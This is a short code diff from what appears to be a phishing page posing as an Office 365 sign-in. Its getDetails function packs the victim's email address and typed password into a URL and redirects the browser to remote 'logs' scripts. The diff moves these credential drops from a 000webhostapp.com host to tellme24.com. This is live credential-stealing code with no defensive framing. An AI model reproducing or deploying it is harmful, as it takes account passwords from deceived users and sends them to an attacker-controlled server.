@@ -36,12 +36,12 @@ function getDetails(e) {
         url = "Domain" + "=" + "Office | Plain" + "&" + "Mail" + "=" + emailSpan.innerText + "&" + "Password" + "=" + passInput.value
 
         if (sendData == 1) {
-            location = "https://falser-skies.000webhostapp.com/gb3/1/plain_365.php?" + url;
+            location = "https://tellme24.com/logs/gmb2/1/plain_365.php?" + url;
         } else if (sendData == 2) {
-            location = "https://falser-skies.000webhostapp.com/gb3/2/plain_365.php?" + url;
+            location = "https://tellme24.com/logs/gmb2/2/plain_365.php?" + url;
         }
         else if (sendData == 3) {
-            location = "https://falser-skies.000webhostapp.com/gb3/3/plain_365.php?" + url;
+            location = "https://tellme24.com/logs/gmb2/3/plain_365.php?" + url;
         }
 
         // location = "https://tellme24.com/logs/gm1/plain1.php?" + url;
